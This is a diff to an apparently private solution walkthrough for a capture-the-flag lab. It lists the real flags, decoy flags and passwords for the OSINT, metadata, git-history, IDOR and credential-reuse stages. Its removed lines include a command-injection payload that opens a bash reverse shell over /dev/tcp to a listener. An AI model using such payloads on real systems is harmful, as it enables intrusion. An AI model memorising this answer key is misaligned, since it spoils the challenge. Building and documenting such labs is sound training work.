@@ -1,59 +1,63 @@
 # Solution Walkthrough
 
 > Private — never player-accessible. This is the exact path verified
-> against the real, built project (not a plan) as of Phase 4. Stage 5
-> (privilege escalation) is not implemented yet — see PROJECT-STATUS.md.
+> against the real, built project (not a plan). Every step below has
+> actually been run and its output observed in this session.
 
 ## Stage 1 — OSINT (Original Flag 1, 100 pts)
 
 Served live by the app, unauthenticated, at `/materials/osint/`
-(also present under `challenge-data/stage1-osint/` in this repo, used
-to build and test the content — both are the same files).
+(also present under `challenge-data/stage1-osint/` in this repo).
 
-1. Visit `http://<vm>:8080/` → landing page links to
-   `/materials/` → `/materials/osint/profile.html` — username
-   `jtyler_dev`, links conceptually to the `ledger-tools` project
-   (mentioned in Activity).
-2. `/materials/osint/project-page.html` — footer has:
-   `Build fingerprint: SYN{osint_fingerprint_f0c73a91}` → **Flag 1**.
-3. Decoys on `profile.html`: an old "CI badge" (`FFLAG:old_profile_rev1_55c2`,
-   plaintext) and a hex-encoded encrypted gist (`FFLAG:deprecated_repo_link_a913`,
-   password `legacyKey2016` printed right next to it).
+1. Visit `http://<vm>:8080/` → landing page links to `/materials/` →
+   `/materials/osint/profile.html` — username `jtyler_dev`, links
+   conceptually to the `ledger-tools` project (mentioned in Activity).
+2. **Decoy, loud and first thing on the page**: a boxed-off callout —
+   `FFLAG:old_profile_rev1_55c2`, framed as a "cached status badge".
+   Fast to find, zero points.
+3. `/materials/osint/project-page.html`'s changelog — the real flag is
+   woven into the v0.4 line's ordinary prose, not called out
+   separately: `...Tagged this build SYN{osint_fingerprint_f0c73a91}
+   in case anyone needs to reference it later.` → **Flag 1**. Requires
+   reading the line, not just skimming for bold/boxed text.
 
 ## Stage 2 — Metadata (Original Flag 2, 100 pts)
 
 Served live at `/materials/metadata/*.png` (also
-`challenge-data/stage2-metadata/*.png` in this repo).
+`challenge-data/stage2-metadata/*.png` in this repo). Two photos only.
 
-1. Download `handover_photo.png`, `exiftool handover_photo.png` →
-   `Comment` field: `handover desk photo — SYN{exif_breadcrumb_8d12ff04}`
+1. `exiftool handover_photo.png` → `Comment` field, phrased as a
+   casual photo caption: `handover desk photo — SYN{exif_breadcrumb_8d12ff04}`
    → **Flag 2**.
-2. Decoys: `old_office.png`'s `Comment` has
-   `FFLAG:camera_test_shot_2017_cc41` (plaintext). `scan_backup.png`'s
-   `Comment` is a hex-encoded ciphertext; its `Artist` field literally
-   says the password (`scanpass2017`) → decrypts to
-   `FFLAG:draft_scan_metadata_77b0`.
+2. **Decoy**: `scan_backup.png`'s `Comment` is a hex-encoded
+   ciphertext; its `Artist` field is deliberately loud —
+   `PASSWORD (use this to unlock the Comment field!): scanpass2017` —
+   decrypts to `FFLAG:draft_scan_metadata_77b0`.
 
 ## Stage 3 — Git history + crypto (Original Flag 3, 150 pts)
 
 Served live at `/materials/stage3-git-history.tar.gz` — download,
-extract (`tar xzf stage3-git-history.tar.gz`), then work inside the
-extracted `stage3-git-history/` repo (also present directly, already
-extracted, as `challenge-data/stage3-git-history/` in this repo).
+extract (`tar xzf stage3-git-history.tar.gz`), work inside the
+extracted `stage3-git-history/` repo.
 
 1. `git log --oneline` shows 4 commits; the working tree only has
-   `README.md`. The commit `Clean up stale backup files` removed 4
-   files.
-2. `git show HEAD~2:notes.txt` (commit `c3bd785`) → passphrase
-   `BlueHarbor-99`.
-3. `git show HEAD~2:handover_backup.enc > backup.enc`, then:
+   `README.md`. The commit `Clean up stale backup files` removed 3
+   files (2 `.enc`, 1 `.txt`).
+2. **Decoy, closer to HEAD (found first scanning log newest-first)**:
+   `HEAD~1`'s commit message is loud on purpose — *"Found the old 2018
+   backup again! Password is old-wifi-2018, decrypt
+   old_backup_2018.enc"*. `git show HEAD~1:old_backup_2018.enc`, decrypt
+   with `old-wifi-2018` → `FFLAG:rotated_out_jan_2019_e2a4`. Fast,
+   obvious, zero points.
+3. The real flag requires going one commit further back and actually
+   reading a separate file: `git show HEAD~2:notes.txt` (plain commit
+   message this time — "Add encrypted handover backup + passphrase
+   note") → passphrase `BlueHarbor-99` (with a quiet aside about the
+   *other*, decoy passphrase — easy to misread which is which).
+   `git show HEAD~2:handover_backup.enc > backup.enc`, then:
    `python3 tools/flagcrypto.py decrypt BlueHarbor-99 backup.enc -`
    → `SYN{git_ghost_61ace7b2}` → **Flag 3**. **Keep this value** — it's
-   the final artifact's password (Stage 13 of the project spec).
-4. Decoys: `git show HEAD~1:old_test_flag.txt` → plaintext
-   `FFLAG:legacy_test_flag_2018_3f09`. `git show HEAD~1:old_backup_2018.enc`
-   decrypts with `old-wifi-2018` (also mentioned in `notes.txt`, as a
-   deliberately-labeled "don't reuse" aside) → `FFLAG:rotated_out_jan_2019_e2a4`.
+   the final artifact's password later (Stage 13 of the project spec).
 
 ## Stage 4 — Web / IDOR (no flag by itself — unlocks the pivot)
 
@@ -62,23 +66,26 @@ foothold — see `player-material/Getting-Started.md`).
 
 1. Log in as `john`. `GET /records/mine` redirects to `/records/1`
    ("Handover notes").
-2. **IDOR**: `GET /records/2` — no ownership check, just login — reveals
-   the "Admin handover record": admin web password `N3tOps-Diag#7` and
-   a pointer to `/admin/diagnostics`.
+2. **IDOR**: `GET /records/2` — no ownership check, just login —
+   reveals the "Admin handover record": the admin web password
+   `N3tOps-Diag#7`, with a one-line aside that it's the same password
+   on the server itself.
 
-## Stage 4 — Admin function / reverse shell (Original Flag 4, 200 pts)
+## Stage 4 — Credential reuse (Original Flag 4, 200 pts)
 
-1. Log in as `admin` / `N3tOps-Diag#7`.
-2. `/admin/diagnostics`'s `host` field is shelled out unsanitized
-   (`CWE-78`). On the listener side (single-host dev/test setup):
-   `nc -lvnp 4444`. Payload for the `host` field:
-   `127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.2.2/4444 0>&1 &' #`
-   — `10.0.2.2` is the SLIRP gateway address the guest sees as "the
-   host", **not** `127.0.0.1` (see `vm/networking.md`). Verified live in
-   this project: listener received the connection and dropped into
-   `admin@forgotten-admin:...$`, confirmed via `id` as
-   `uid=1002(admin)`, never root.
-3. Once on-box as `admin`:
+There is no second web vulnerability here — the password reuse itself
+*is* the exploit. (An earlier build of this project used an
+admin-only command-injection tool for this step; removed by design in
+favor of this simpler, equally realistic lesson.)
+
+1. `ssh admin@<vm>` using `N3tOps-Diag#7` — the same credential
+   disclosed by the IDOR. SSH password auth is enabled for this one
+   account only (`/etc/ssh/sshd_config.d/90-admin-password-auth.conf`,
+   a `Match User admin` block); every other account is key-only or
+   disabled. Verified live: `id` → `uid=1002(admin) gid=110(admin)
+   groups=110(admin)`. `john` gets `Permission denied (publickey)` if
+   tried the same way — password auth isn't even offered to him.
+2. Once logged in:
    ```
    cat /home/admin/evidence/decrypt_notes.txt
    # original_flag_4.enc -> oldhandoff-rotate-2024
@@ -86,9 +93,10 @@ foothold — see `player-material/Getting-Started.md`).
        /home/admin/flags/original_flag_4.enc -
    # SYN{admin_blindspot_9f4e2c18}  -> Flag 4
    ```
-4. Decoy: `original_flag_4_backup.enc` decrypts with `prerotate-2023`
-   (also in `decrypt_notes.txt`) → `FFLAG:backup_pre_rotation_88c5`.
-   `evidence/old_ticket.txt` has plaintext `FFLAG:ticket_closed_wontfix_19d7`.
+3. **Decoy, loud and named for it**: `/home/admin/evidence/FOUND_A_FLAG.txt`
+   — *"Found this while cleaning up old tickets, looks like a flag:"* —
+   `FFLAG:ticket_closed_wontfix_19d7`. Plaintext, no decryption needed,
+   sitting right next to the real evidence.
 
 ## Stage 5 — Linux privilege escalation
 
@@ -111,7 +119,6 @@ Player begins this stage as Linux `admin` (confirmed above, no sudo).
 
 ## Final artifact (Original Flag 5, 250 pts)
 
-Once root (Phase 5):
 ```
 python3 /opt/tools/flagcrypto.py decrypt "SYN{git_ghost_61ace7b2}" \
     /root/final_evidence.enc -
@@ -122,19 +129,22 @@ Note the password is Flag 3's *decrypted value*, not `BlueHarbor-99`
 wrong password fails; `admin` cannot read `/root` at all
 (`Permission denied`) before privilege escalation.
 
-Decoys in `/root`: `old_evidence.enc` decrypts with `SnapshotKey-2023`
-(written in `root_note.txt`) → `FFLAG:old_root_snapshot_f02e`.
-`root_note.txt` itself also contains the plaintext decoy
-`FFLAG:old_root_memo_4b61`.
+**Decoy, loud and positioned first**: `/root/root_note.txt` opens with
+*"Finally got root, huh? Before you get excited:"* then points at
+`old_evidence.enc` as if it's the prize — password `SnapshotKey-2023`
+right there in the same sentence → decrypts to
+`FFLAG:old_root_snapshot_f02e`. The genuine artifact requires the
+cross-stage password from Flag 3 instead, which isn't written anywhere
+on this box.
 
 ## Verified facts (not assumptions)
 
-- All of the above (Stages 1–5, final artifact decrypt) was run for
-  real in this session: against the actual files for Stages 1–3, and
-  against the live, booted VM over HTTP + SSH for Stage 4, Stage 5, and
-  the final artifact — including a genuine `admin` → `euid=0` privilege
-  transition with no instructor `sudo` involved. See
-  `PROJECT-STATUS.md`'s Phase 3/4/5 sections for the exact commands and
-  output.
-- `./scripts/validate-flags.sh` passes all structural + decryption
-  checks.
+- All of the above was run for real in this session: the files for
+  Stages 1–3, and the live, booted VM over HTTP + SSH for Stage 4,
+  Stage 5, and the final artifact — including a genuine `admin` →
+  `euid=0` privilege transition with no instructor `sudo` involved, and
+  a genuine password-based SSH login with no key. See
+  `PROJECT-STATUS.md`'s phase sections for exact commands and output.
+- `./scripts/validate-flags.sh` and `./scripts/health-check.sh` both
+  pass all checks against the live VM after every change described
+  here.
